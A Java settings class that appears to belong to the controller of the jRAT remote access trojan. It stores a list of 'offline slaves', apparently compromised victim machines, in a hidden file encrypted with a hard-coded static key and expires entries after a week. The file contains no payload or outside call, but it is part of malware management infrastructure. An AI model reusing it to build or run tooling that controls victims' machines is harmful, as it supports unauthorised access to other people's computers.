package se.jrat.client.settings;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;

import se.jrat.client.Globals;
import se.jrat.client.OfflineSlave;
import se.jrat.common.crypto.CryptoUtils;
import se.jrat.common.crypto.KeyUtils;

public class OfflineSlaves extends AbstractSettings {
	
	private static final List<OfflineSlave> LIST = new ArrayList<OfflineSlave>();
	private static final OfflineSlaves INSTANCE = new OfflineSlaves();
	private static final long TTL = 1000L * 60L * 60L * 24L * 7L;
	
	public static OfflineSlaves getGlobal() {
		return INSTANCE;
	}

	public List<OfflineSlave> getList() {
		return LIST;
	}
	
	@Override
	public void save() throws Exception {
		CipherOutputStream cos = new CipherOutputStream(new FileOutputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, KeyUtils.STATIC_KEY));
		BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cos));
		
		for (OfflineSlave os : LIST) {
			writer.write(OfflineSlave.toString(os));
			writer.newLine();
		}
		
		writer.close();
	}

	@Override
	public void load() throws Exception {
		LIST.clear();
		
		CipherInputStream cos = new CipherInputStream(new FileInputStream(getFile()), CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, KeyUtils.STATIC_KEY));

		BufferedReader reader = new BufferedReader(new InputStreamReader(cos));
		
		String line;
		
		while ((line = reader.readLine()) != null) {
			OfflineSlave os = OfflineSlave.fromString(line);
			
			if (System.currentTimeMillis() - os.getCreation() > TTL) {
				continue;
			}
			
			LIST.add(os);
		}
		
		reader.close();
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".offline");
	}

	public void add(OfflineSlave offlineSlave) {
		for (OfflineSlave os : getList()) {
			if (os.equals(offlineSlave)) {
				return;
			}
		}
		
		LIST.add(offlineSlave);
	}

}
